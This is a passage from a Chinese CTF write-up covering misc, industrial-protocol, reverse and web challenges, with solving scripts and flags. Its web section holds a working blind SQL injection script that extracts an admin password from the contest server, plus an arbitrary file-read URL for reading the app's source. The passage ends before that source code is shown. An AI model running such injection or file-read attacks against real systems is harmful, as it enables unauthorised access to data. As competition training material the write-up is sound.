<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;&#x27;</span>]*<span class="number">392</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">392</span>):</span><br><span class="line">    <span class="built_in">list</span>[j] = os.path.getmtime(<span class="string">&#x27;H:\\&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;.crypto&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">392</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">str</span>(<span class="built_in">list</span>[i]) == <span class="string">&#x27;1629859254.863367&#x27;</span>):</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    tmp += flag[k]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp) == <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(tmp,<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<blockquote>
<p>You are so cool!!! this is your key: 6a90383cd08c</p>
</blockquote>
<p>然后这392个文件是crypto文件<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061334.png" alt="在这里插入图片描述"></p>
<p>用这个，然后用这个key来解0.crypto和1.crypto(因为这两个时间不一样)<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_061348.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>flag{ba40c40b-1356-4fc6-8cc7-6a90383cd08c}</p>
</blockquote>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="藏在s7里的秘密"><a href="#藏在s7里的秘密" class="headerlink" title="藏在s7里的秘密"></a>藏在s7里的秘密</h3><p>下载下来的流量包是部分损坏的，使用网站在线修复<br><a target="_blank" rel="noopener" href="http://f00l.de/hacking/pcapfix.php">http://f00l.de/hacking/pcapfix.php</a><br>然后打开流量包，发现有png，但是就如此提取，必定会混入奇奇怪怪的东西<br>于是观察之后，用tshark来提取</p>
<blockquote>
<p>tshark -r  Ks3qlAF1bTuysqpJ.pcap -T fields -e s7comm.resp.data -Y “s7comm.param.func == 0x05 and ip.src==192.168.139.1”  &gt; png.txt</p>
</blockquote>
<p>得到16进制数<br>用010打开，将十六进制数复制进去，即可得到图片，但是明显发现高度不对，因此修改任意高度，得到flag<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060517.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>flag{FSfeQefjg}</p>
</blockquote>
<h3 id="老练的黑客"><a href="#老练的黑客" class="headerlink" title="老练的黑客"></a>老练的黑客</h3><p>和之前工控的那道，不能说是完全相似，只能说是一模一样<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43264813/article/details/118362238">类原题博客&amp;&amp;赶快关注工控大佬的博客</a><br>根据此博客，能直接找到错误的值<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060715.png" alt="在这里插入图片描述"><br>第1199流找到22b8<br>然后根据观察前面的流，发现read的值是跟在过滤之后的第2个流<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060807.png" alt="在这里插入图片描述"><br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Misc/clipboard_20210913_060824.png" alt="在这里插入图片描述"><br>然后尝试理解提交</p>
<blockquote>
<p>flag{22b81194}</p>
</blockquote>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>SM3<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_061908.png"></p>
<p>然后把下图的复制进脚本<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_061944.png"></p>
<p>百度一个国密SM3脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#                            国产SM3加密算法</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">##############################################################################</span></span><br><span class="line"></span><br><span class="line">IV = <span class="string">&quot;7380166f 4914b2b9 172442d7 da8a0600 a96f30bc 163138aa e38dee4d b0fb0e4e&quot;</span></span><br><span class="line">IV = <span class="built_in">int</span>(IV.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>)</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">    a.append(<span class="number">0</span>)</span><br><span class="line">    a[i] = (IV &gt;&gt; ((<span class="number">7</span> - i) * <span class="number">32</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">IV = a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">out_hex</span>(<span class="params">list1</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%08x&quot;</span> % i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate_left</span>(<span class="params">a, k</span>):</span></span><br><span class="line">    k = k % <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; k) &amp; <span class="number">0xFFFFFFFF</span>) | ((a &amp; <span class="number">0xFFFFFFFF</span>) &gt;&gt; (<span class="number">32</span> - k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">T_j = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">    T_j.append(<span class="number">0</span>)</span><br><span class="line">    T_j[i] = <span class="number">0x79cc4519</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="number">64</span>):</span><br><span class="line">    T_j.append(<span class="number">0</span>)</span><br><span class="line">    T_j[i] = <span class="number">0x7a879d8a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FF_j</span>(<span class="params">X, Y, Z, j</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= j <span class="keyword">and</span> j &lt; <span class="number">16</span>:</span><br><span class="line">        ret = X ^ Y ^ Z</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">16</span> &lt;= j <span class="keyword">and</span> j &lt; <span class="number">64</span>:</span><br><span class="line">        ret = (X &amp; Y) | (X &amp; Z) | (Y &amp; Z)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GG_j</span>(<span class="params">X, Y, Z, j</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= j <span class="keyword">and</span> j &lt; <span class="number">16</span>:</span><br><span class="line">        ret = X ^ Y ^ Z</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">16</span> &lt;= j <span class="keyword">and</span> j &lt; <span class="number">64</span>:</span><br><span class="line">        <span class="comment"># ret = (X | Y) &amp; ((2 ** 32 - 1 - X) | Z)</span></span><br><span class="line">        ret = (X &amp; Y) | ((~ X) &amp; Z)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">P_0</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> X ^ (rotate_left(X, <span class="number">9</span>)) ^ (rotate_left(X, <span class="number">17</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">P_1</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> X ^ (rotate_left(X, <span class="number">15</span>)) ^ (rotate_left(X, <span class="number">23</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CF</span>(<span class="params">V_i, B_i</span>):</span></span><br><span class="line">    W = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        weight = <span class="number">0x1000000</span></span><br><span class="line">        data = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i * <span class="number">4</span>, (i + <span class="number">1</span>) * <span class="number">4</span>):</span><br><span class="line">            data = data + B_i[k] * weight</span><br><span class="line">            weight = <span class="built_in">int</span>(weight / <span class="number">0x100</span>)</span><br><span class="line">        W.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="number">68</span>):</span><br><span class="line">        W.append(<span class="number">0</span>)</span><br><span class="line">        W[j] = P_1(W[j - <span class="number">16</span>] ^ W[j - <span class="number">9</span>] ^ (rotate_left(W[j - <span class="number">3</span>], <span class="number">15</span>))) ^ (rotate_left(W[j - <span class="number">13</span>], <span class="number">7</span>)) ^ W[j - <span class="number">6</span>]</span><br><span class="line">        str1 = <span class="string">&quot;%08x&quot;</span> % W[j]</span><br><span class="line">    W_1 = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>):</span><br><span class="line">        W_1.append(<span class="number">0</span>)</span><br><span class="line">        W_1[j] = W[j] ^ W[j + <span class="number">4</span>]</span><br><span class="line">        str1 = <span class="string">&quot;%08x&quot;</span> % W_1[j]</span><br><span class="line"></span><br><span class="line">    A, B, C, D, E, F, G, H = V_i</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    print &quot;00&quot;,</span></span><br><span class="line"><span class="string">    out_hex([A, B, C, D, E, F, G, H])</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>):</span><br><span class="line">        SS1 = rotate_left(((rotate_left(A, <span class="number">12</span>)) + E + (rotate_left(T_j[j], j))) &amp; <span class="number">0xFFFFFFFF</span>, <span class="number">7</span>)</span><br><span class="line">        SS2 = SS1 ^ (rotate_left(A, <span class="number">12</span>))</span><br><span class="line">        TT1 = (FF_j(A, B, C, j) + D + SS2 + W_1[j]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        TT2 = (GG_j(E, F, G, j) + H + SS1 + W[j]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        D = C</span><br><span class="line">        C = rotate_left(B, <span class="number">9</span>)</span><br><span class="line">        B = A</span><br><span class="line">        A = TT1</span><br><span class="line">        H = G</span><br><span class="line">        G = rotate_left(F, <span class="number">19</span>)</span><br><span class="line">        F = E</span><br><span class="line">        E = P_0(TT2)</span><br><span class="line"></span><br><span class="line">        A = A &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        B = B &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        C = C &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        D = D &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        E = E &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        F = F &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        G = G &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        H = H &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    V_i_1 = []</span><br><span class="line">    V_i_1.append(A ^ V_i[<span class="number">0</span>])</span><br><span class="line">    V_i_1.append(B ^ V_i[<span class="number">1</span>])</span><br><span class="line">    V_i_1.append(C ^ V_i[<span class="number">2</span>])</span><br><span class="line">    V_i_1.append(D ^ V_i[<span class="number">3</span>])</span><br><span class="line">    V_i_1.append(E ^ V_i[<span class="number">4</span>])</span><br><span class="line">    V_i_1.append(F ^ V_i[<span class="number">5</span>])</span><br><span class="line">    V_i_1.append(G ^ V_i[<span class="number">6</span>])</span><br><span class="line">    V_i_1.append(H ^ V_i[<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">return</span> V_i_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_msg</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="comment"># print(msg)</span></span><br><span class="line">    len1 = <span class="built_in">len</span>(msg)</span><br><span class="line">    reserve1 = len1 % <span class="number">64</span></span><br><span class="line">    msg.append(<span class="number">0x80</span>)</span><br><span class="line">    reserve1 = reserve1 + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 56-64, add 64 byte</span></span><br><span class="line">    range_end = <span class="number">56</span></span><br><span class="line">    <span class="keyword">if</span> reserve1 &gt; range_end:</span><br><span class="line">        range_end = range_end + <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(reserve1, range_end):</span><br><span class="line">        msg.append(<span class="number">0x00</span>)</span><br><span class="line"></span><br><span class="line">    bit_length = (len1) * <span class="number">8</span></span><br><span class="line">    bit_length_str = [bit_length % <span class="number">0x100</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        bit_length = <span class="built_in">int</span>(bit_length / <span class="number">0x100</span>)</span><br><span class="line">        bit_length_str.append(bit_length % <span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        msg.append(bit_length_str[<span class="number">7</span> - i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(msg)</span></span><br><span class="line"></span><br><span class="line">    group_count = <span class="built_in">round</span>(<span class="built_in">len</span>(msg) / <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, group_count):</span><br><span class="line">        B.append(msg[i * <span class="number">64</span>:(i + <span class="number">1</span>) * <span class="number">64</span>])</span><br><span class="line"></span><br><span class="line">    V = []</span><br><span class="line">    V.append(IV)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, group_count):</span><br><span class="line">        V.append(CF(V[i], B[i]))</span><br><span class="line"></span><br><span class="line">    y = V[i + <span class="number">1</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> y:</span><br><span class="line">        result = <span class="string">&#x27;%s%08x&#x27;</span> % (result, i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2byte</span>(<span class="params">msg</span>):</span>  <span class="comment"># 字符串转换成byte数组</span></span><br><span class="line">    ml = <span class="built_in">len</span>(msg)</span><br><span class="line">    msg_byte = []</span><br><span class="line">    msg_bytearray = msg  <span class="comment"># 如果加密对象是字符串，则在此对msg做encode()编码即可，否则不编码</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">        msg_byte.append(msg_bytearray[i])</span><br><span class="line">    <span class="keyword">return</span> msg_byte</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte2str</span>(<span class="params">msg</span>):</span>  <span class="comment"># byte数组转字符串</span></span><br><span class="line">    ml = <span class="built_in">len</span>(msg)</span><br><span class="line">    str1 = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">        str1 += <span class="string">b&#x27;%c&#x27;</span> % msg[i]</span><br><span class="line">    <span class="keyword">return</span> str1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2byte</span>(<span class="params">msg</span>):</span>  <span class="comment"># 16进制字符串转换成byte数组</span></span><br><span class="line">    ml = <span class="built_in">len</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> ml % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        msg = <span class="string">&#x27;0&#x27;</span> + msg</span><br><span class="line">    ml = <span class="built_in">int</span>(<span class="built_in">len</span>(msg) / <span class="number">2</span>)</span><br><span class="line">    msg_byte = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">        msg_byte.append(<span class="built_in">int</span>(msg[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> msg_byte</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte2hex</span>(<span class="params">msg</span>):</span>  <span class="comment"># byte数组转换成16进制字符串</span></span><br><span class="line">    ml = <span class="built_in">len</span>(msg)</span><br><span class="line">    hexstr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">        hexstr = hexstr + (<span class="string">&#x27;%02x&#x27;</span> % msg[i])</span><br><span class="line">    <span class="keyword">return</span> hexstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KDF</span>(<span class="params">Z, klen</span>):</span>  <span class="comment"># Z为16进制表示的比特串（str），klen为密钥长度（单位byte）</span></span><br><span class="line">    klen = <span class="built_in">int</span>(klen)</span><br><span class="line">    ct = <span class="number">0x00000001</span></span><br><span class="line">    rcnt = ceil(klen / <span class="number">32</span>)</span><br><span class="line">    Zin = hex2byte(Z)</span><br><span class="line">    Ha = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rcnt)):</span><br><span class="line">        msg = Zin + hex2byte(<span class="string">&#x27;%08x&#x27;</span> % ct)</span><br><span class="line">        <span class="comment"># print(msg)</span></span><br><span class="line">        Ha = Ha + hash_msg(msg)</span><br><span class="line">        <span class="comment"># print(Ha)</span></span><br><span class="line">        ct += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Ha[<span class="number">0</span>: klen * <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sm3_hash</span>(<span class="params">msg, Hexstr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    封装方法，外部调用</span></span><br><span class="line"><span class="string">    :param msg: 二进制流（如若需要传入字符串，则把str2byte方法里msg做encode()编码一下，否则不编码）</span></span><br><span class="line"><span class="string">    :param Hexstr: 0</span></span><br><span class="line"><span class="string">    :return: 64位SM3加密结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (Hexstr):</span><br><span class="line">        msg_byte = hex2byte(msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg_byte = str2byte(msg)</span><br><span class="line">    <span class="keyword">return</span> hash_msg(msg_byte)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    enc=[<span class="string">&#x27;6b8575c6092240cde08414dafd535bee&#x27;</span>,<span class="string">&#x27;f0f659f2951290ad5e076b3fe5e70425&#x27;</span>,<span class="string">&#x27;c1d6c663570de9fad13ddef955d8a02b&#x27;</span>,<span class="string">&#x27;14c4e442fba6d820ea90ae73ed90ad83&#x27;</span>,<span class="string">&#x27;25d997669868d0cf89782349256efb33&#x27;</span>,<span class="string">&#x27;78b1ea6bb1ac10287864c8f52d2758b6&#x27;</span>,<span class="string">&#x27;67d1259c26765356ddb58c6faf28080c&#x27;</span>,<span class="string">&#x27;c1e14e0c86f55ba1d74b35b66f96ad36&#x27;</span>,<span class="string">&#x27;3e4f3ee942d1a57182e24df201b7022b&#x27;</span>,<span class="string">&#x27;c35557f7e5c389061fb2e2ffa1a644ad&#x27;</span>,<span class="string">&#x27;15593844fae18fe1a25f3a9017c73810&#x27;</span>,<span class="string">&#x27;c6c21ca591a63755fd77bf5c55a0238a&#x27;</span>,<span class="string">&#x27;f90cb529875e83cc191c0e10ead6f73e&#x27;</span>,<span class="string">&#x27;3ddbe25f9b183c3e2c33c3b1e501fcd8&#x27;</span>,<span class="string">&#x27;30fdf04c347f1d4e335bda670d54eaaf&#x27;</span>,<span class="string">&#x27;33feb100c8c7c3769af6e9d26486c646&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    e=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">map</span> = string.printable</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">            flag=<span class="string">&#x27;&#x27;</span>+k</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> sm3_hash(<span class="built_in">bytes</span>(<span class="built_in">str</span>(flag).encode()))[:<span class="number">32</span>]==enc[i]:</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>倒数第5的flag = ‘’+k，每次输出一个，将将其填入，直到最后即可<br>当最后填入wel30m_t0_sm3!!!<br>此时输出空白，则此为key<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_062110.png"></p>
<blockquote>
<p>flag{g0042ye_t0_sm4}</p>
</blockquote>
<h3 id="2048小游戏"><a href="#2048小游戏" class="headerlink" title="2048小游戏"></a>2048小游戏</h3><p>一个不知道啥鬼游戏，找到有flag的逻辑<br>有个不知道什么的运算。但是经过几次测试，发现分数越多，那个函数得到的值越小。，那就i慢慢凑出来，发现分数为0x2100时刚好满足条件，然后下面就是根据这个分数，异或一个固定值得到一个数，然后下面就是验证前四个数值，就是上面那个数的倒数，然后下面就是对0x2100%8+48，0x2100/8<br>|<img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Rev/clipboard_20210913_062224.png"></p>
<p>最后</p>
<blockquote>
<p>flag{b0d800402}</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>和Inctf的Rssa其中的一个小点考点相同，直接改脚本即可</p>
<p>原文连接：<a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/f2e36905-38ae-4c20-8749-5aba747e5b91#">https://www.yuque.com/docs/share/f2e36905-38ae-4c20-8749-5aba747e5b91?#</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strtohex</span>(<span class="params">s</span>):</span></span><br><span class="line">    ss = <span class="string">&quot;0x&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ss +=  <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://116.62.239.41:4323/&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">character = <span class="string">&quot;zsuaqwxcderfvbgtyhnmjuiklop0123456789.&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> character:</span><br><span class="line">        <span class="keyword">if</span> j &gt;= <span class="number">1</span> <span class="keyword">and</span> j &lt;=<span class="number">6</span> :</span><br><span class="line">            payload = strtohex(flag + i + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = strtohex(<span class="string">&quot;%&quot;</span> + flag[-<span class="number">6</span>:] + i + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        sql = <span class="string">&quot;1,2 as username from user where username=0x61646d696e and password like &#123;&#125; union select 1&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;sql1&quot;</span>:<span class="string">&quot;%27&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sql2&quot;</span>:sql</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(burp0_url, headers=burp0_headers,params=params)</span><br><span class="line">        <span class="built_in">print</span> i + <span class="string">&quot; : &quot;</span> + res.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nonono&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;字符过长！！！&quot;</span></span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nop&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;.&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>flag为<code>53a2d36d72760586dfc400e54b54564b</code></p>
<h3 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h3><p>考点：文件读取、Python反序列化</p>
<p>右键注释中获得<code>&lt;!--    ?pic=1.jpg   --&gt;</code>，发现是一个任意文件读取，使用<code>http://116.62.239.41:4322/?pic=/app/app.py</code>读取源文件，源码如下</p>
